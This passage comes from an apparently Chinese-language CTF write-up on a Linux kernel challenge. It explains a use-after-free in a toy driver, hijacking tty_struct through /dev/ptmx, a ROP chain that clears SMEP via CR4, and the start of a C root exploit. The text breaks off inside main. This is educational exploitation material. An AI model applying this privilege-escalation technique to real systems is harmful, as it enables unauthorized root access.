class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br>__int64 __fastcall <span class="hljs-title function_">babyioctl</span><span class="hljs-params">(file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> command, <span class="hljs-type">unsigned</span> __int64 arg)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rbx</span><br>  __int64 v5; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(filp, *(_QWORD *)&amp;command);<br>  v4 = v3;<br>  <span class="hljs-keyword">if</span> ( command == <span class="hljs-number">0x10001</span> )<br>  &#123;<br>    kfree(babydev_struct.device_buf);<br>    babydev_struct.device_buf = (<span class="hljs-type">char</span> *)_kmalloc(v4, <span class="hljs-number">0x24000C0</span>LL);<br>    babydev_struct.device_buf_len = v4;<br>    printk(<span class="hljs-string">&quot;alloc done\n&quot;</span>, <span class="hljs-number">0x24000C0</span>LL, v5);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_2EB, v3, v3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-22LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到我们可以通过该函数来重新分配内核堆块给全局变量<code>babydev_struct</code>,这样显得open有点多余了说<br>然后我们来看关键漏洞点,也就是release函数,或者说close函数,如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">babyrelease</span><span class="hljs-params">(inode *inode, file *filp)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(inode, filp);<br>  kfree(babydev_struct.device_buf);<br>  printk(<span class="hljs-string">&quot;device release\n&quot;</span>, filp, v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到他是释放掉了我们的全局变量指向的分配堆块,但并没有赋空值,所以存在一个悬垂指针供我们利用.<br>其余的read和write函数就是正常的读写,没必要单独贴出来.</p><h3 id="2-利用tty-struct达成提权"><a href="#2-利用tty-struct达成提权" class="headerlink" title="2.利用tty_struct达成提权"></a>2.利用<code>tty_struct</code>达成提权</h3><p>我们的<code>/dev</code>目录下面存在一个伪终端设备<code>/dev/ptmx</code>,该设备打开后会创建一个<code>tty_struct</code>结构体,其中同其他设备一样存在着<code>tty_operations</code>结构体,因此不难理解我们可以利用UAF来劫持该结构体,然后覆写其中的函数指针至我们的ROP链来达成提权效果,大致思路如下:</p><ol><li>分别打开两次, <code>/dev/babydev</code>,那么我们就能得到同时指向一个堆块的两个指针</li><li>我们通过ioctl函数来修改堆块的大小,改变成能劫持下面tty_struct的大小</li><li>然后我们释放掉其中一个设备,释放掉对应全局变量堆块,但是我们仍存在一个指向该释放堆块的指针</li><li>我们再打开<code>/dev/ptmx</code>设备,因此分配一个堆块来存放<code>tty_struct</code>结构体</li><li>我们就可以利用之前还剩余的那个指针来修改<code>tty_struct</code>指向我们构造的<code>fake_operations</code>(什么时候构造都可以,可以指向栈中,但是要在本步骤前熬)</li><li>之后我们调用<code>fake_operations</code>中的相关函数就可以达成任意代码执行,进而提权.</li></ol><p>其中最主要的地方其实就是我们需要知道<code>tty_struct</code>的大小,然后修改之前堆块的大小来满足释放的堆块重新分配了.我们接下来就是寻找他的大小,这里直接剧透为0x2e0</p><p>其中<code>tty_struct</code>结构体的大致情况如下,位于<code>include/linux/tty.h</code>中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br><span class="hljs-type">int</span>magic;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span><span class="hljs-comment">/* class device or NULL (e.g. ptys, serdev) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> index;<br><br><span class="hljs-comment">/* Protects ldisc changes: Lock tty not pty */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ld_semaphore</span> <span class="hljs-title">ldisc_sem</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_ldisc</span> *<span class="hljs-title">ldisc</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">atomic_write_lock</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">legacy_mutex</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">throttle_mutex</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">termios_rwsem</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">winsize_mutex</span>;</span><br><span class="hljs-comment">/* Termios values are protected by the termios rwsem */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ktermios</span> <span class="hljs-title">termios</span>, <span class="hljs-title">termios_locked</span>;</span><br><span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-type">int</span> count;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">winsize</span>;</span><span class="hljs-comment">/* winsize_mutex */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-type">bool</span> stopped;<br><span class="hljs-type">bool</span> tco_stopped;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) flow;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">pgrp</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">session</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> pktstatus;<br><span class="hljs-type">bool</span> packet;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) ctrl;<br><br><span class="hljs-type">int</span> hw_stopped;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> receive_room;<span class="hljs-comment">/* Bytes free for queue */</span><br><span class="hljs-type">int</span> flow_change;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> *<span class="hljs-title">link</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> write_wait;<br><span class="hljs-type">wait_queue_head_t</span> read_wait;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">hangup_work</span>;</span><br><span class="hljs-type">void</span> *disc_data;<br><span class="hljs-type">void</span> *driver_data;<br><span class="hljs-type">spinlock_t</span> files_lock;<span class="hljs-comment">/* protects tty_files list */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tty_files</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_TTY_BUF_SIZE 4096</span><br><br><span class="hljs-type">int</span> closing;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *write_buf;<br><span class="hljs-type">int</span> write_cnt;<br><span class="hljs-comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">SAK_work</span>;</span> <span class="hljs-comment">//这里存在一个函数指针,可以泄露基地址</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_port</span> *<span class="hljs-title">port</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>其中值得注意的就是我们的<code>const struct tty_operations *ops;</code><br>它指向一个<code>tty_operations</code>结构体,它位于<code>include/linux/tty_driver.h</code>当中, 如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br><span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>      <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br><span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br><span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*write_room)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*chars_in_buffer)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br><span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br><span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br><span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br><span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br><span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br><span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br><span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br><span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br><span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br><span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br><span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br><span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br><span class="hljs-type">int</span>  (*get_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br><span class="hljs-type">int</span>  (*set_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br><span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br><span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br><span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br><span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">int</span> (*proc_show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *);<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>这里我们执行到ROP链后写cr4寄存器为0x6f0来绕过SMEP,然后打ret2user，但这里每次提权成功后返回userland的时候到swapgs后的pop rbp总会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0xffffffff81063694 &lt;native_swapgs+4&gt;      swapgs <br> ► 0xffffffff81063697 &lt;native_swapgs+7&gt;      pop    rbp<br>   0xffffffff81063698 &lt;native_swapgs+8&gt;      ret    <br>    ↓<br>   0xffffffff814e35ef &lt;tty_audit_log+239&gt;    iretq  <br>   0xffffffff814e35f1 &lt;tty_audit_log+241&gt;    ret    <br> <br>   0xffffffff814e35f2 &lt;tty_audit_log+242&gt;    dec    dword ptr [rax - 0x75]<br>   0xffffffff814e35f5 &lt;tty_audit_log+245&gt;    push   rbp<br>   0xffffffff814e35f6 &lt;tty_audit_log+246&gt;    test   al, init_module+36            &lt;72&gt;<br>   0xffffffff814e35f8 &lt;tty_audit_log+248&gt;    mov    esi, dword ptr [rbp - 0x50]<br>   0xffffffff814e35fb &lt;tty_audit_log+251&gt;    mov    rdi, rbx<br>   0xffffffff814e35fe &lt;tty_audit_log+254&gt;    call   audit_log_n_hex            &lt;audit_log_n_hex&gt;<br>──────────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7ffeb93ba830 ◂— 0x0<br>01:0008│     0x7ffeb93ba838 —▸ 0xffffffff814e35ef (tty_audit_log+239) ◂— iretq  <br>02:0010│     0x7ffeb93ba840 —▸ 0x402001 ◂— endbr64 <br>03:0018│     0x7ffeb93ba848 ◂— 0x33 /* &#x27;3&#x27; */<br>04:0020│     0x7ffeb93ba850 ◂— 0x246<br>05:0028│     0x7ffeb93ba858 —▸ 0x7ffeb93ba7d0 —▸ 0xffff880005fc7758 ◂— 0xcc<br>06:0030│     0x7ffeb93ba860 ◂— 0x2b /* &#x27;+&#x27; */<br>07:0038│     0x7ffeb93ba868 ◂— 0x0<br>──────────────────────────────────────────────────────────────────────────────────────────────────<br> ► f 0 0xffffffff81063697 native_swapgs+7<br>──────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; i all-registers cr3<br>cr3            0x5fe2000           [ PDBR=2 PCID=0 ]<br></code></pre></td></tr></table></figure><p>据推测这里因该确实是KPTI开启的情况，但为什么加了nopti还是有这个存在呢，难以理解，但是本题利用的过程算是摸清楚了</p><p>exp如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __USE_GNU</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810a1810</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810a1420</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff810d238d</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rsi = <span class="hljs-number">0xffffffff811dd9ae</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rdx = <span class="hljs-number">0xffffffff81440b72</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> mov_rc4_rdi_pop_rbp = <span class="hljs-number">0xffffffff81004d80</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> swapgs_pop_rbp = <span class="hljs-number">0xffffffff81063694</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> iretq = <span class="hljs-number">0xffffffff8181a797</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> mov_rsp_rax_ret = <span class="hljs-number">0xffffffff8181bfc5</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rax_ret = <span class="hljs-number">0xffffffff8100ce6e</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> mov_rdi_rax_pop2 = <span class="hljs-number">0xffffffff8133b32e</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  info_log(<span class="hljs-string">&quot;Status has been saved Successfully!&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>&#123;<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  saveStatus();<br>  <span class="hljs-type">int</span> i; 